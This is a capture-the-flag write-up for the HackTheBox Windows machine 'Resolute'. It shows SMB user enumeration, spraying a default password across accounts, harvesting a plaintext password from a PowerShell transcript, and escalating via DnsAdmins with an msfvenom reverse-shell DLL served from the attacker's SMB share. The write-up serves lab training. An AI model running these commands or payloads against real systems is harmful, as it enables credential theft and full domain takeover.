---
layout: post
title: "HTB: Resolute"
tags: htb windows
---

Resolute was the first active Windows box I ever rooted on HTB. Solving this box involved abusing weak / lazy configurations to get user shell and then exploiting a vulnerability related to [abusing permissions granted to "DNSAdmins" groups in an AD environment](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) to get root. I honestly didn't know much about this "DNSAdmin" exploit until I did this box, so let's re-explore together :)

### Recce

Doing the usual initial nmap scan, you see a great number of ports:
```
Discovered open port 139/tcp on 10.10.10.169
Discovered open port 445/tcp on 10.10.10.169
Discovered open port 53/tcp on 10.10.10.169
Discovered open port 135/tcp on 10.10.10.169
Discovered open port 389/tcp on 10.10.10.169
Discovered open port 88/tcp on 10.10.10.169
Discovered open port 3269/tcp on 10.10.10.169
Discovered open port 464/tcp on 10.10.10.169
Discovered open port 593/tcp on 10.10.10.169
Discovered open port 3268/tcp on 10.10.10.169
```

### Shell as melanie
Without going into too much detail, let's jump right into SMB enumeration, since ports `139` and `445` are open.
  
I usually start with `enum4linux` for SMB enumeration. Let's check out the output:
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 28 12:29:02 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... resolute.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on resolute.htb    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for resolute.htb    |
 ============================================ 
Looking up status of 10.10.10.169
No reply from 10.10.10.169

 ===================================== 
|    Session Check on resolute.htb    |
 =====================================                                                                                                             
[+] Server resolute.htb allows sessions using username '', password ''                                                                             
[+] Got domain/workgroup name:                                                                                                                     
                                                                                                                                                   
 ===========================================                                                                                                       
|    Getting domain SID for resolute.htb    |                                                                                                      
 ===========================================                                                                                                       
Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on resolute.htb    |
 ====================================== 
[+] Got OS info for resolute.htb from smbclient: 
[+] Got OS info for resolute.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on resolute.htb    |
 ============================= 
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ========================================= 
|    Share Enumeration on resolute.htb    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on resolute.htb

 ==================================================== 
|    Password Policy Information for resolute.htb    |
 ==================================================== 


[+] Attaching to resolute.htb using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:RESOLUTE.HTB)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on resolute.htb    |
 ============================== 

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group 'DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+] Getting domain group memberships:
Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group 'Domain Users' (RID: 513) has member: MEGABANK\per
Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator

 ======================================================================= 
|    Users on resolute.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================= 
|    Getting printer info for resolute.htb    |
 ============================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Feb 28 12:40:27 2020
```
Key information:
- Domain is `MEGABANK`,
- We've got a list of user accounts,
- We're given a glimpse of some local groups - the `Remote Management Users` group indicates that we could open a Windows Remote Management shell if we have the right credentials.

Most importantly, we've also given a big clue:
```
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
```

This tells us that new accounts have their default password set to `Welcome123!` - if we tried this with `Marko Novak`'s account, we see that it didn't work. So maybe Marko was diligent enough to change away his default password - but what if others weren't so diligant? So let's try it on all the user accounts we discovered.
  
  
First, we can gather all user accounts from our `enum4linux` output and store them in a file (e.g. `users.txt`) via a simple bash command (here I've stored my output in a file called `initial.txt`):
```
kali@kali:~$ cat initial.txt | grep "user:" | cut -d"[" -f 2 | cut -d "]" -f 1 > users.txt
```
Inside `users.txt`:
```
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Then we can do a simple loop through all users and attempt to authenticate with the password `Welcome123!` by using `smbclient`:
```
for i in $(cat users.txt);do echo "[+] $i" && smbclient -L resolute.htb -U $i%"Welcome123!";done
```
```
[+] Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
[+] Guest
session setup failed: NT_STATUS_LOGON_FAILURE
[+] krbtgt
session setup failed: NT_STATUS_LOGON_FAILURE
[+] DefaultAccount
session setup failed: NT_STATUS_LOGON_FAILURE
[+] ryan
session setup failed: NT_STATUS_LOGON_FAILURE
[+] marko
session setup failed: NT_STATUS_LOGON_FAILURE
[+] sunita
session setup failed: NT_STATUS_LOGON_FAILURE
[+] abigail
session setup failed: NT_STATUS_LOGON_FAILURE
[+] marcus
session setup failed: NT_STATUS_LOGON_FAILURE
[+] sally
session setup failed: NT_STATUS_LOGON_FAILURE
[+] fred
session setup failed: NT_STATUS_LOGON_FAILURE
[+] angela
session setup failed: NT_STATUS_LOGON_FAILURE
[+] felicia
session setup failed: NT_STATUS_LOGON_FAILURE
[+] gustavo
session setup failed: NT_STATUS_LOGON_FAILURE
[+] ulf
session setup failed: NT_STATUS_LOGON_FAILURE
[+] stevie
session setup failed: NT_STATUS_LOGON_FAILURE
[+] claire
session setup failed: NT_STATUS_LOGON_FAILURE
[+] paulo
session setup failed: NT_STATUS_LOGON_FAILURE
[+] steve
session setup failed: NT_STATUS_LOGON_FAILURE
[+] annette
session setup failed: NT_STATUS_LOGON_FAILURE
[+] annika
session setup failed: NT_STATUS_LOGON_FAILURE
[+] per
session setup failed: NT_STATUS_LOGON_FAILURE
[+] claude
session setup failed: NT_STATUS_LOGON_FAILURE
[+] melanie

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
[+] zach
session setup failed: NT_STATUS_LOGON_FAILURE
[+] simon
session setup failed: NT_STATUS_LOGON_FAILURE
[+] naoki
session setup failed: NT_STATUS_LOGON_FAILURE
```

Awesome - our default password worked for `melanie`! Let's try using her account to login remotely via Windows Remote Management:
```
kali@kali:~$ evil-winrm -i resolute.htb -u melanie -p 'Welcome123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> 
```
Grab user.txt here from `melanie`'s Desktop.

### Priv: melanie --> ryan
At this stage, you could run the awesome [winpeas.exe binary](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to run some standard enumeration, or you could be like me and just go around looking for interesting stuff. 
  
  
If you did the latter, eventually you would come across the `PSTranscripts` folder, which is sort of like the PowerShell equivalent of `.bash_history`. This folder is usually hidden in the `C:\` directory, and is only visible if you force it to show with a `-Force` option:
```
*Evil-WinRM* PS C:\> dir -Force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        5/30/2020   7:56 PM      402653184 pagefile.sys
```

Let's go inside `PSTranscripts` and take a look:
```
*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir
*Evil-WinRM* PS C:\PSTranscripts> dir -Force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -Force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

We see that there's a PowerShell transcript for us to look into. So let's look inside:
```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

Now I don't know if you noticed the juicy clue - but if you didn't, here it is:
```
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

So let's try and login as `ryan`:
```
kali@kali:~/htb/boxes/resolute/smb$ evil-winrm -i resolute.htb -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```
Sadly, `ryan` isn't really an admin. But we're getting closer.

### Priv: ryan -> root
On `ryan`'s desktop, there's a `note.txt`:
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

..which doesn't really tell us anything other than we have a tight window to do stuff if we make any system changes. But that's fine - we haven't really started enumerating `ryan`. Let's start with looking at `ryan`'s privileges:
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We see that in the `MEGABANK` domain, `ryan` belongs to the `Contractors` and `DnsAdmins` groups. Now it just so happens that there is a privilege escalation vulnerability related to the `DNSAdmins` groups, [as mentioned earlier](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

When I was doing the box, I found a [clearer guide for exploiting this vulnerability](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/). So let's follow:
  
  
First, we prepare a malicious DLL using `msfvenom` on our attacking machine:
```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.64 LPORT=4444 --platform=windows -f dll > plugin.dll
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```
  
  
Next, we share the malicious DLL from our attacking machine via SMB (we can do this easily by using [impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket)):
```
kali@kali:~$ mkdir smb;cp plugin.dll smb
kali@kali:~$ sudo smbserver.py share smb
[sudo] password for kali: 
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
(Note that the syntax for `smbserver` is: `smbserver.py <name of share you want to set> <name of folder you want to share>`
  
  
Then, setup a netcat listener on your attacking machine:
```
kali@kali:~$ sudo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
```
  
  
Back on the box, enter the following command `dnscmd.exe <FQDN of the box> /config /serverlevelplugindll \\<our attacking machine>\share\plugin.dll`. The `FQDN` is important - you can find it from the SMB portion of your completed nmap scan:
```
Host script results:
|_clock-skew: mean: 2h47m54s, deviation: 4h37m08s, median: 7m53s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-02-28T09:34:26-08:00
```
Our `FQDN`: `Resolute.megabank.local`. So let's use that in our command:
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd.exe Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.64\share\plugin.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
  
  
Still on the box, enter `sc.exe stop dns`, followed by `sc.exe start dns` to restart `DNS`:
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3800
        FLAGS              :
```
  
  
Back on your attacking machine, you can verify that there was a callback on your `smbserver.py`:
```
kali@kali:~/htb/boxes/resolute/root$ sudo smbserver.py share smb
[sudo] password for kali: 
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,54564)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:37ff36d5abe41ccc903a5d8a21e4ea25:010100000000000000985d6e0537d6016e684c27952e132800000000010010006500460075006f005200420074007900030010006500460075006f0052004200740079000200100058006d00610078004b007100570043000400100058006d00610078004b007100570043000700080000985d6e0537d60106000400020000000800300030000000000000000000000000400000f48cd4423e722cab13301e56d5633fdea21506fe2303dd3d70b555e2bd1fa1830a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360034000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Handle: 'ConnectionResetError' object is not subscriptable
